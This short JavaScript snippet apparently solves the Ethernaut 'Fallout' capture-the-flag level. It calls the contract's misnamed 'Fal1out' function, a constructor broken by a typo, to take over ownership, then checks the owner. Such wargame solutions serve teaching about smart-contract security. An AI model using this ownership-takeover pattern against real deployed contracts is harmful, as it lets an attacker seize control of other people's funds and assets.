// Create an instance of the contract
const contractInstance = new web3.eth.Contract(contract.abi, contract.address);
// call the fake constructor :) --> Now you are the owner 😀
await contractInstance.methods
  .Fal1out()
  .send({ from: player });

// Check that you are the owner
await contract.owner();
